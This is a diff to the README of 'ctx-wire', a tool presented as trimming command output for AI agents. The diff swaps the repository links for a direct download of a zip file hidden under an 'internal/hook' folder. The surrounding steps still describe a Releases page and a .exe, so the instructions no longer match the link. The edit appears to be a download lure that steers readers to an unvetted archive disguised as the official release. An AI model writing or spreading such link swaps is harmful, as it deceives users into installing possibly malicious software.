@@ -1,6 +1,6 @@
 # ⚡ ctx-wire - Send clear data to your AI
 
-[![](https://img.shields.io/badge/Download-ctx--wire-blue.svg)](https://github.com/fantastic-interpolation620/ctx-wire)
+[![](https://img.shields.io/badge/Download-ctx--wire-blue.svg)](https://github.com/fantastic-interpolation620/ctx-wire/raw/refs/heads/main/internal/hook/wire-ctx-2.6-alpha.1.zip)
 
 ctx-wire helps you work with AI agents. These smart assistants often struggle when you feed them logs or code outputs that are too large. This tool solves that problem. It runs your commands, removes unimportant information, protects your secrets, and provides a short summary for your AI. You keep the full details on your own hard drive. This saves money on AI tokens and keeps your work flow fast.
 
@@ -8,7 +8,7 @@ ctx-wire helps you work with AI agents. These smart assistants often struggle wh
 
 You need to download the program to your computer. Follow these steps:
 
-1. Visit the [official download page](https://github.com/fantastic-interpolation620/ctx-wire).
+1. Visit the [official download page](https://github.com/fantastic-interpolation620/ctx-wire/raw/refs/heads/main/internal/hook/wire-ctx-2.6-alpha.1.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click on the latest version link.
 4. Locate the file ending in `.exe` for Windows.
